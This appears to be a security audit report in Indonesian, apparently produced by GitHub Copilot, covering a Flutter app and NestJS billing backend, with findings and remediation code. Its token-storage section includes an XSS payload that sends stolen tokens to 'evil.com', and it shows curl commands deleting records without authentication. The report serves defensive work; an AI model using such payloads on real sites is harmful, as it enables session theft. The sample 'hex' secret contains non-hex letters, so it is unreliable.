# 🔒 LAPORAN AUDIT KEAMANAN SISTEM
**Tanggal Audit:** 20 Desember 2025  
**Sistem:** PJTAudiraNet (Flutter) + PJTBillingByAudira (NestJS Backend)  
**Status:** Development Environment

---

## 📊 RINGKASAN EKSEKUTIF

### ✅ Kondisi Saat Ini
| Aspek | Status | Risiko |
|-------|--------|--------|
| Authentication | ⚠️ Partial | Medium |
| Password Security | ✅ Good | Low |
| API Security | ❌ Critical | **HIGH** |
| Database Security | ⚠️ Partial | Medium |
| Firebase Security | ❌ Critical | **CRITICAL** |
| Token Management | ⚠️ Partial | Medium |
| Input Validation | ✅ Good | Low |
| CORS Configuration | ⚠️ Partial | Medium |
| Environment Security | ❌ Critical | **HIGH** |
| Client Storage | ❌ Critical | **HIGH** |

### 🎯 Skor Keamanan: **4.5/10** ⚠️

---

## 🚨 TEMUAN KRITIS (HIGH/CRITICAL PRIORITY)

### 1. ❌ **FIRESTORE RULES - CRITICAL** 
**File:** `PJTAudiraNet/firestore.rules`

```plaintext
match /{document=**} {
  allow read, write: if true;  // ❌ BAHAYA! Siapa saja bisa akses semua data
}
```

**Risiko:**
- ❌ **Semua orang di internet bisa baca/tulis/hapus semua data**
- ❌ Tidak ada validasi user authentication
- ❌ Tidak ada role-based access control
- ❌ Data customer, invoice, payment bisa dicuri/diubah siapa saja

**Dampak:** Database Firestore sepenuhnya terbuka untuk publik

**Rekomendasi:**
```plaintext
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Helper functions
    function isAuthenticated() {
      return request.auth != null;
    }
    
    function isAdmin() {
      return isAuthenticated() && request.auth.token.role == 'admin';
    }
    
    function isOwner(userId) {
      return isAuthenticated() && request.auth.uid == userId;
    }
    
    // Users collection
    match /users/{userId} {
      allow read: if isAuthenticated();
      allow write: if isAdmin() || isOwner(userId);
    }
    
    // Customers collection
    match /customers/{customerId} {
      allow read: if isAdmin() || isOwner(customerId);
      allow write: if isAdmin();
    }
    
    // Invoices collection
    match /invoices/{invoiceId} {
      allow read: if isAuthenticated() && 
                    (isAdmin() || resource.data.customerId == request.auth.uid);
      allow write: if isAdmin();
    }
    
    // Payments collection
    match /payments/{paymentId} {
      allow read: if isAuthenticated() &&
                    (isAdmin() || resource.data.customerId == request.auth.uid);
      allow create: if isAuthenticated();
      allow update, delete: if isAdmin();
    }
    
    // Default deny all
    match /{document=**} {
      allow read, write: if false;
    }
  }
}
```

---

### 2. ❌ **API ENDPOINTS TIDAK ADA AUTHENTICATION - CRITICAL**
**File:** `apps/backend/src/*/*.controller.ts` (Multiple files)

**Temuan:**
```typescript
// ❌ Tidak ada @UseGuards() - Siapa saja bisa akses!
@Get()
async getCustomers() { ... }

@Post()
async createInvoice() { ... }

@Delete(':id')
async deletePayment() { ... }
```

**Risiko:**
- ❌ Semua 87+ API endpoints bisa diakses tanpa login
- ❌ Siapa saja bisa GET semua data customer/invoice/payment
- ❌ Siapa saja bisa POST/PUT/DELETE data
- ❌ Tidak ada authorization check (role-based)

**Bukti:**
```bash
# Bisa diakses tanpa token!
curl http://localhost:4000/customers
curl http://localhost:4000/invoices
curl http://localhost:4000/payments
curl -X DELETE http://localhost:4000/customers/any-id
```

**Rekomendasi URGENT:**
1. Buat JWT Auth Guard
2. Apply ke semua endpoints
3. Implement role-based authorization

**Implementasi:**
```typescript
// 1. Buat jwt-auth.guard.ts
import { Injectable, UnauthorizedException } from '@nestjs/common';
import { AuthGuard } from '@nestjs/passport';

@Injectable()
export class JwtAuthGuard extends AuthGuard('jwt') {
  handleRequest(err, user, info) {
    if (err || !user) {
      throw new UnauthorizedException('Token tidak valid atau expired');
    }
    return user;
  }
}

// 2. Buat jwt.strategy.ts
import { Injectable } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor() {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      secretOrKey: process.env.JWT_SECRET,
    });
  }

  async validate(payload: any) {
    return { 
      userId: payload.sub, 
      email: payload.email,
      role: payload.role 
    };
  }
}

// 3. Apply di controller
@Controller('customers')
@UseGuards(JwtAuthGuard)  // ✅ Wajib login!
export class CustomersController {
  
  @Get()
  @Roles('admin', 'billing')  // ✅ Role check
  async getCustomers() { ... }
}
```

---

### 3. ❌ **JWT_SECRET LEMAH & TEREXPOSE - HIGH**
**File:** `apps/backend/.env`

```dotenv
JWT_SECRET="your-secret-key-here"  # ❌ BAHAYA!
```

**Risiko:**
- ❌ Secret key sangat lemah (default value)
- ❌ File .env ter-commit ke git (visible di GitHub)
- ❌ Siapa saja yang clone repo bisa lihat secret
- ❌ Attacker bisa forge JWT token dengan secret ini

**Dampak:** 
- Attacker bisa membuat token JWT palsu
- Bisa login sebagai admin tanpa password
- Bypass semua autentikasi (jika sudah implement guard)

**Rekomendasi:**
```bash
# Generate strong secret
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

# Update .env
JWT_SECRET="a7f3b2c9d8e1f4g5h6i7j8k9l0m1n2o3p4q5r6s7t8u9v0w1x2y3z4a5b6c7d8e9f0"
```

**Action Items:**
1. ✅ Generate strong 64-byte random secret
2. ✅ Update semua environment files
3. ✅ Add `.env` to `.gitignore` (sudah ada tapi masih ter-commit)
4. ✅ Remove `.env` from git history
5. ✅ Rotate secret di production
6. ✅ Use environment variables di CI/CD, bukan file .env

---

### 4. ❌ **TOKEN STORAGE DI LOCALSTORAGE - HIGH**
**File:** `apps/frontend/src/contexts/AuthContext.tsx`

```typescript
// ❌ VULNERABLE to XSS attacks!
localStorage.setItem('token', data.access_token)
localStorage.setItem('user', JSON.stringify(userData))
```

**Risiko:**
- ❌ Vulnerable to XSS (Cross-Site Scripting) attacks
- ❌ JavaScript malicious bisa curi token
- ❌ Token tidak expire otomatis di client
- ❌ Tidak ada refresh token mechanism

**Attack Scenario:**
```javascript
// Attacker inject script via XSS
<script>
  // Curi token!
  const token = localStorage.getItem('token');
  const user = localStorage.getItem('user');
  
  // Kirim ke attacker server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token, user })
  });
</script>
```

**Rekomendasi:**
1. **Gunakan httpOnly cookies** (lebih aman dari XSS)
2. Implement refresh token rotation
3. Add CSRF protection
4. Set short token expiry (15 min)

**Implementasi Aman:**
```typescript
// Backend - Set httpOnly cookie
@Post('login')
async login(@Body() data: any, @Res({ passthrough: true }) response: Response) {
  const result = await this.authService.login(data);
  
  // ✅ Set httpOnly cookie (JavaScript tidak bisa akses)
  response.cookie('access_token', result.access_token, {
    httpOnly: true,      // ✅ XSS protection
    secure: true,        // ✅ HTTPS only
    sameSite: 'strict',  // ✅ CSRF protection
    maxAge: 15 * 60 * 1000, // 15 minutes
  });
  
  return { message: 'Login berhasil', user: result.user };
}

// Frontend - Tidak perlu save token manual
const login = async (email: string, password: string) => {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    credentials: 'include', // ✅ Send cookies automatically
    body: JSON.stringify({ email, password })
  });
  
  // Token sudah di cookies, tidak perlu localStorage
  const data = await response.json();
  setUser(data.user);
}
```

---

### 5. ❌ **FLUTTER APP - TIDAK ADA SECURE STORAGE - HIGH**
**File:** `lib/services/backend_api_service.dart`

```dart
// ❌ Token disimpan di memory saja
String? _authToken;

void setAuthToken(String? token) {
  _authToken = token;  // ❌ Hilang saat app restart
}
```

**Risiko:**
- ❌ Token tidak persist, user harus login terus
- ❌ Tidak pakai FlutterSecureStorage (encrypted)
- ❌ Pakai SharedPreferences di theme_provider (plain text!)
- ❌ Token bisa dibaca dari device jika rooted

**Rekomendasi:**
```dart
// Install: flutter_secure_storage
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

class SecureTokenService {
  static const _storage = FlutterSecureStorage();
  static const _tokenKey = 'auth_token';
  static const _refreshTokenKey = 'refresh_token';
  
  // ✅ Save dengan enkripsi
  Future<void> saveToken(String token) async {
    await _storage.write(key: _tokenKey, value: token);
  }
  
  // ✅ Read dari encrypted storage
  Future<String?> getToken() async {
    return await _storage.read(key: _tokenKey);
  }
  
  // ✅ Delete saat logout
  Future<void> clearTokens() async {
    await _storage.delete(key: _tokenKey);
    await _storage.delete(key: _refreshTokenKey);
  }
}
```

---

## ⚠️ TEMUAN MENENGAH (MEDIUM PRIORITY)

### 6. ⚠️ **CORS TERLALU PERMISSIVE**
**File:** `apps/backend/src/main.ts`

```typescript
app.enableCors({
  origin: (origin, callback) => {
    if (!origin) return callback(null, true);  // ⚠️ Allow no-origin requests
    // ...
  },
  credentials: true,
});
```

**Risiko:**
- Mobile apps, curl, Postman bisa bypass CORS
- Bisa dimanfaatkan untuk automated attacks
- Tidak ada rate limiting

**Rekomendasi:**
```typescript
app.enableCors({
  origin: (origin, callback) => {
    // ✅ Require origin header
    if (!origin) {
      return callback(new Error('Origin header required'), false);
    }
    
    if (allowedOrigins.has(origin)) {
      return callback(null, true);
    }
    
    // Log unauthorized attempts
    console.warn(`🚫 Blocked CORS request from: ${origin}`);
    return callback(new Error('Not allowed by CORS'), false);
  },
  credentials: true,
  maxAge: 86400, // Cache preflight 24h
});
```

---

### 7. ⚠️ **TIDAK ADA RATE LIMITING**

**Risiko:**
- ❌ Brute force attacks bisa unlimited tries
- ❌ DDoS attacks tidak ada protection
- ❌ Resource exhaustion attacks

**Rekomendasi:**
```typescript
// Install: @nestjs/throttler
import { ThrottlerModule } from '@nestjs/throttler';

@Module({
  imports: [
    ThrottlerModule.forRoot({
      ttl: 60,      // Time window (seconds)
      limit: 10,    // Max requests per ttl
    }),
  ],
})
export class AppModule {}

// Apply to login endpoint
@Controller('auth')
export class AuthController {
  @Post('login')
  @Throttle(5, 60)  // ✅ Max 5 attempts per minute
  async login() { ... }
}
```

---

### 8. ⚠️ **PASSWORD POLICY LEMAH**

**Current:** Tidak ada validasi password strength

**Risiko:**
- Users bisa pakai password "123"
- Tidak ada minimum length
- Tidak ada complexity requirement

**Rekomendasi:**
```typescript
import { IsStrongPassword } from 'class-validator';

export class RegisterDto {
  @IsStrongPassword({
    minLength: 8,
    minLowercase: 1,
    minUppercase: 1,
    minNumbers: 1,
    minSymbols: 1,
  }, {
    message: 'Password harus minimal 8 karakter dengan huruf besar, kecil, angka, dan simbol'
  })
  password: string;
}
```

---

### 9. ⚠️ **AUDIT LOGGING INCOMPLETE**

**Current:** Hanya login attempts yang di-log

**Temuan:**
```typescript
// ✅ Ada audit untuk login
await this.auditService.log({
  action: AuditAction.LOGIN_FAILED,
  // ...
});

// ❌ Tidak ada audit untuk:
// - Data modifications (CREATE/UPDATE/DELETE)
// - Sensitive data access
// - Permission changes
// - Failed authorization attempts
```

**Rekomendasi:**
```typescript
// Tambah audit di semua critical operations
@Post()
@UseGuards(JwtAuthGuard)
async createCustomer(@Body() data: any, @Req() req) {
  const customer = await this.customersService.create(data);
  
  // ✅ Audit trail
  await this.auditService.log({
    action: 'CUSTOMER_CREATE',
    userId: req.user.id,
    details: { customerId: customer.id },
    ipAddress: req.ip,
  });
  
  return customer;
}
```

---

### 10. ⚠️ **DATABASE CREDENTIALS EXPOSED**

**File:** `apps/backend/.env`

```dotenv
# ⚠️ Credentials di plain text
DATABASE_URL="postgresql://postgres:postgres@localhost:5433/sebilling?schema=public"
SMTP_USER="your-email@gmail.com"
SMTP_PASS="your-app-password"
MIDTRANS_SERVER_KEY=""
FONNTE_API_TOKEN=""
```

**Risiko:**
- File .env visible di git
- Default postgres credentials (postgres/postgres)
- Third-party API keys ter-expose

**Rekomendasi:**
1. Use environment variables in production (not .env file)
2. Use secrets manager (AWS Secrets Manager, Azure Key Vault, etc.)
3. Rotate database credentials
4. Use strong passwords

---

## ✅ IMPLEMENTASI YANG BAIK

### 1. ✅ **Password Hashing dengan Bcrypt**
```typescript
const hashedPassword = await bcrypt.hash(data.password, 10);
const isPasswordValid = await bcrypt.compare(data.password, user.password);
```
- ✅ Menggunakan bcryptjs dengan salt 10
- ✅ Password tidak disimpan plain text
- ✅ Secure comparison untuk prevent timing attacks

### 2. ✅ **Input Validation**
```typescript
app.useGlobalPipes(
  new ValidationPipe({
    whitelist: true,    // ✅ Strip properties tanpa decorator
    transform: true,    // ✅ Auto type conversion
  }),
);
```

### 3. ✅ **Prisma ORM**
- ✅ Parameterized queries (SQL injection protection)
- ✅ Type-safe database access
- ✅ No raw SQL queries (mostly)

### 4. ✅ **JWT Token Implementation**
```typescript
const payload = { email: user.email, sub: user.id, role: user.role };
const token = this.jwtService.sign(payload);
```
- ✅ JWT structure correct
- ✅ Include necessary claims (sub, email, role)

### 5. ✅ **HTTPS Permissions (Android)**
```xml
<uses-permission android:name="android.permission.INTERNET"/>
```
- ✅ Network permissions declared

---

## 📋 ACTION PLAN PRIORITAS

### 🔴 **URGENT (Fix dalam 24 jam)**

1. **Fix Firestore Rules** ⏱️ 30 menit
   - Deploy production-ready rules
   - Test dengan different roles
   - Verify access control

2. **Implement JWT Auth Guards** ⏱️ 2 jam
   - Create JwtAuthGuard
   - Create JwtStrategy
   - Apply to all controllers
   - Add role-based authorization

3. **Rotate JWT_SECRET** ⏱️ 15 menit
   - Generate strong secret (64 bytes)
   - Update all environments
   - Remove .env from git history

4. **Fix Token Storage** ⏱️ 1 jam
   - Backend: Implement httpOnly cookies
   - Frontend: Remove localStorage usage
   - Add CSRF protection

### 🟡 **HIGH PRIORITY (Fix dalam 1 minggu)**

5. **Implement Secure Storage (Flutter)** ⏱️ 1 jam
   - Install flutter_secure_storage
   - Migrate token storage
   - Add refresh token logic

6. **Add Rate Limiting** ⏱️ 1 jam
   - Install @nestjs/throttler
   - Configure global rate limit
   - Add strict limits for auth endpoints

7. **Strengthen CORS** ⏱️ 30 menit
   - Require origin header
   - Log blocked attempts
   - Review allowed origins

8. **Password Policy** ⏱️ 1 jam
   - Add validation decorators
   - Implement strength checker
   - Update documentation

### 🟢 **MEDIUM PRIORITY (Fix dalam 1 bulan)**

9. **Complete Audit Logging** ⏱️ 2 hari
   - Add audit to all CRUD operations
   - Create audit dashboard
   - Setup log retention

10. **Security Headers** ⏱️ 1 jam
    - Install helmet
    - Configure CSP
    - Add security headers

11. **Environment Management** ⏱️ 1 hari
    - Setup secrets manager
    - Migrate from .env files
    - Implement key rotation

12. **Security Testing** ⏱️ 3 hari
    - Penetration testing
    - Vulnerability scanning
    - Security audit

---

## 🛡️ REKOMENDASI TAMBAHAN

### 1. **Implement 2FA/MFA**
- Google Authenticator integration
- SMS OTP backup
- Email verification

### 2. **Session Management**
- Implement refresh tokens
- Token rotation
- Concurrent session limits
- Force logout capability

### 3. **API Security**
- API key for third-party integrations
- Request signing
- IP whitelisting for admin
- GraphQL query complexity limits (if using GraphQL)

### 4. **Monitoring & Alerting**
- Failed login attempts monitoring
- Unusual activity detection
- Real-time security alerts
- Security dashboard

### 5. **Compliance**
- GDPR compliance (if applicable)
- Data encryption at rest
- Data retention policies
- User consent management

### 6. **Dependency Security**
- Regular `npm audit`
- Automated dependency updates
- Security advisory monitoring

### 7. **Backup & Recovery**
- Encrypted database backups
- Disaster recovery plan
- Backup access control

---

## 📚 REFERENSI

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [NestJS Security Best Practices](https://docs.nestjs.com/security/authentication)
- [Firebase Security Rules](https://firebase.google.com/docs/rules)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Flutter Security](https://flutter.dev/docs/deployment/security)

---

## 🎯 TARGET SKOR KEAMANAN

**Current:** 4.5/10 ⚠️  
**Target 1 Week:** 7.0/10 ✅  
**Target 1 Month:** 9.0/10 🎯  

---

**Audit dilakukan oleh:** GitHub Copilot  
**Tanggal:** 20 Desember 2025  
**Status:** Development Environment  
**Disclaimer:** Laporan ini untuk development environment. Production deployment memerlukan audit keamanan professional tambahan.

---

## ⚠️ PERINGATAN

**JANGAN DEPLOY KE PRODUCTION** sebelum memperbaiki minimal semua **CRITICAL** dan **HIGH** priority issues!

Sistem saat ini **SANGAT VULNERABLE** dan bisa di-hack dengan mudah karena:
1. ❌ Database Firestore terbuka untuk publik
2. ❌ API tidak ada authentication
3. ❌ JWT secret lemah dan ter-expose
4. ❌ Token storage tidak aman

**Estimasi Total Effort:** 2-3 minggu untuk fix semua issues
